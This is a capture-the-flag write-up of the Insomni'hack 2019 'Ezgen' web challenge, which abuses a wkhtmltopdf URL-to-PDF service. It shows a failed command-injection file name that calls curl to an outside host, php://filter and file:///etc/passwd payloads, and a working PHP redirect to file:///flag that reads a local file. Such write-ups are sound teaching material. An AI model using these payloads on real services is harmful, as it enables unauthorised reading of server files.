# Insomni'hack 2019 - Ezgen

##
## https://gist.github.com/ast3ro/ca6eec74293be5992f35b18023b420a4
##

<pre>Category: Web
Difficulty: Easy</pre>

We were offered a website that generates a pdf from a given URL.

## How it works

* Enter a URL and submit
* Browser is redirected to /webtopdf.php?url=http://site.url
* If everything is OK, a pdf is rendered with the content of the submitted site
* Sometimes the webtopdf.php redirects to homepage (if submitted URL is 404 for instance or submitted string is not a valid URL)
* There's javascript validation for the URL in the webpage; since there's not CSRF we can just call the `/webtopdf.php?url=xxx` directly without worrying of the validation, + it works as a GET request.

## Enumeration, reconnaissance

* Enumarate folders / files with [SecLists quickhits.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/quickhits.txt) - nothing interesting there
* Noticed a 403 on /flag - thought maybe that would be where the flag is but...
* Noticed a 403 for all non-existing URLs ^_^
* I generated a proper pdf and ran exiftool against it in case anything would be of interest:

`$ exiftool webtopdf.pdf`

I noticed that the pdf was created by `wkhtmltopdf 0.12.5`, which appears to be the [latest stable version](https://wkhtmltopdf.org/downloads.html).

There was also a mention of Qt in the results of exiftool so I thought maybe wkhtmltopdf was ran in some sort of window manager but it seems it is actually the webkit that's used to render the web page that uses Qt. Maybe not the right path right now but something to keep in mind.

* Searched google for all sites that have `inurl:webtopdf.php` and found only one instance that did not seem to be related to wkhtmltopdf: https://github.com/bogiesoft/hotelmis-ota/blob/master/webtoPDF.php

## Play with the behavior

* Try setting https://google.fr - OK, PDF is rendered
* Try setting the challenge URL - OK, PDF is rendered
* Try setting the challenge background image - OK, PDF is rendered
* Try setting http://localhost/flag, http://127.0.0.1/flag ... - nothing got rendered
* Try some dumb URLs with null bytes, command injection classics - page redirects to home
* Try injecting PHP wrappers LFI payloads, e.g. ?url=php://filter/convert.base64-encode/resource=/etc/passwd and other files - page redirects to home
* Try fuzzing a bit webtopdf.php parameters - nothing

## Try and actually attack webtopdf.php

### Known vulnerabilities

Here are some easy to find vulns that talk about wkhtmltopdf:

* [File inclusion vulnerability](https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/)
* [Cure53 pentest report with local file access via HTML to PDF conversion](https://cure53.de/pentest-report_accessmyinfo.pdf)
* [Arbitrary command injection in pdfkit](https://snyk.io/vuln/SNYK-RUBY-PDFKIT-20071)
* Found nothing of interest on https://cvedetails.org

### Arbitrary command line injection

It seems the following command line is executed at some point:

`$ wkhtmltopdf www.google.com google.pdf`

So, at first I thought it might be possible to inject something in the command line; I connected to a server I control and created a file called `test out.pdf; curl http://mysite.lol/pingback` that I could hit on:

`http://mysite.lol/test out.pdf; curl http://mysite.lol/pingback`

I tried various files with such syntax on my server and pointed webtopdf.php to these URLs; got the hit on the whole `test out.pdf; curl http://mysite.lol/pingback` file but did not manage to get any command line injection.

### Local file inclusion via redirection

* After much frustration I decided to try other challenges, until I finally spent the last hour on Ezgen
* I asked an admin if I was on the right track, he could only confirm that the flag was located at /flag on the server
* Knowing that the service can hit my server, I tried and submit a URL containing the following but only got blank iframes in the pdf:

```html
<iframe src="file:///etc/passwd" height="500" width="500">
  <iframe src="file:///flag" height="500" width="500">
```

* After a while, I tried a location header pointing to /flag.

**It did the trick and we got the flag printed into the pdf! At 3:57 AM**

Contents of the php file hosted on my server:

```php
<?php

header("Location: file:///flag");

?>
```

We submitted the flag 2 minutes before the end of the CTF. That. Was. Close.

----

## Lessons learned

* In the end it was an easy challenge, so maybe next time start simple first! If it fails, think about more complex attack vectors.
* Think carefully before acting, sometimes it's really useful to just draw on paper who calls what, what's rendered where etc.
* Try focusing on a single problem at a time instead of flitting from a challenge to another...
* Never give up. Or maybe give up, but after the CTF has ended :)

----

Other interesting links around wkhtmltopdf:

* https://github.com/wkhtmltopdf/wkhtmltopdf/issues/1777
* https://blogs.gnome.org/mcatanzaro/2016/02/01/on-webkit-security-updates/
* https://wkhtmltopdf.org/usage/wkhtmltopdf.txt
* https://github.com/mikehaertl/phpwkhtmltopdf
